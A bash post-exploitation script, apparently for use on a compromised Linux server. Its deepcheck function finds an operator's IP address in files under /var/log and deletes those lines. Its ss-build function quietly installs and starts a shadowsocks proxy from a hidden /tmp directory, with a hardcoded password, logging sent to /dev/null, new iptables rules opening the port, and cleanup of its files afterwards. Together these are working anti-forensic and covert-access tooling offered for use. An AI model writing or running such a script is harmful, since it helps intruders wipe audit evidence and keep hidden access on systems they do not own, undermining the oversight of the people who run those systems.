#!/bin/bash
export REST="\e[0m" #_fdsagadsfasdgadsgsss
export UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
export ColorRed="\e[31m" #_fdsagadsfasdgadsgsss
export ColorGreen="\e[32m" #_fdsagadsfasdgadsgsss
export ColorYellow="\e[33m" #_fdsagadsfasdgadsgsss
export ColorBlue="\e[34m" #_fdsagadsfasdgadsgsss
export ColorMagenta="\e[35m" #_fdsagadsfasdgadsgsss
export ColorCyan="\e[36m" #_fdsagadsfasdgadsgsss
function gglog { #_fdsagadsfasdgadsgsss
    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}" #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
gglog 'load' "deepcheck/shadowsocks";

function test_cmd { #_fdsagadsfasdgadsgsss
   which $1 2>&1 1>/dev/null;#_fdsagadsfasdgadsgsss
   echo $?; #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss

deepcheck() {
    echo -ne "found and delete or only found [y/other]:${UNDERLINE}"
    read FOUND_DELE
    echo -e "${REST}clear [${FOUND_DELE}]"
    for f in $(grep -Ilr "$my_ip" /var/log/);do
        gglog "$my_ip exists in $f."
        if [[ $FOUND_DELE == "y" ]];then
            sed -ie "/$my_ip/d" $f;
            if [ -f ${f}e ];then
            rm ${f}e;
            fi
        fi
    done
}
gglog 'load' 'ss-check to check if open ss'
ss-check() {
    gglog "searching config file for ss"
    grep -nIr "server_port" /etc/  2>/dev/null
    gglog "searching log file for ss"
    find /var/log -name "*shadowsocks*"
    if [ $(( $(ps aux | grep shadowsocks | grep -v 'grep' | wc -l) )) -gt 0 ];then
        gglog "this server running shadowsocks"
    fi
}

gglog 'load' 'ss-build to build one time ss for use'
ss-build(){
    if [ $(test_cmd git) -ne 0 ];then
	gglog "no git . now to install .";
        if [ $(test_cmd yum) -eq 0 ];then
		if [ -f /tmp/yum.log ];then
		  cp /tmp/yum.log /tmp/.yum.log;
		fi
		yum install -y git;

		if [ -f /tmp/.yum.log ];then
			mv /tmp/.yum.log /tmp/
		fi
	else
		apt-get install -y git;
	fi	
    fi
    git clone https://github.com/shadowsocks/shadowsocks.git /tmp/.shs && cd /tmp/.shs
    git fetch origin master:master && git checkout master ;
    cat << EOF >> .shs
{
	"server":"0.0.0.0",
	"server_port":43421,
	"method":"aes-256-cfb",
	"password":"hello1234",
	"log-file":"/dev/null"
}
EOF
    python -m shadowsocks.server -c .shs -d start && gglog "port:" "43421" "password: " "hello1234"
    iptables -A INPUT -p tcp --dport 43421 -j ACCEPT
    iptables -A INPUT -p udp --dport 43421 -j ACCEPT
    sleep 1
    rm -rf /tmp/.shs;
}
